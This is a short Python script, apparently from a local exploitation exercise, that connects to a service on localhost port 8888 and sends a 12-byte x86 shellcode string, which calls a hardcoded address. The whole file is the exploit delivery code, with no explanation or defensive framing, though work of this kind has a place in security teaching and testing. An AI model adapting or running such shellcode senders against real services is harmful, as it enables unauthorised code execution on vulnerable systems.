#!/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8888))

shellcode = "\x51\x53\xb8\xa6\x8f\x04\x08\xff\xd0\x83\xc4\x08"

print("Sending shellcode (" + str(len(shellcode)) + " bytes)")
s.send(shellcode)
